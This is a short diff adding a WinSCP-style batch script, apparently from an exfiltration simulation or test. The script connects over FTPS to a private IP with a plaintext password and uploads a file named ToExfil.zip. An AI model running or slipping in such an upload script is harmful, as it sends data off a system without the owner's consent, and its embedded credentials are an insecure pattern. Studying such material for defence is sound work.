@@ -1,0 +1,8 @@
+option batch abort
+option confirm off
+open ftps://sftp_user:Tester@123@10.1.1.23/ -explicit
+cd /Downloads
+mkdir archive_20250717
+cd archive_20250717
+put C:\Users\Public\ToExfil.zip
+exit
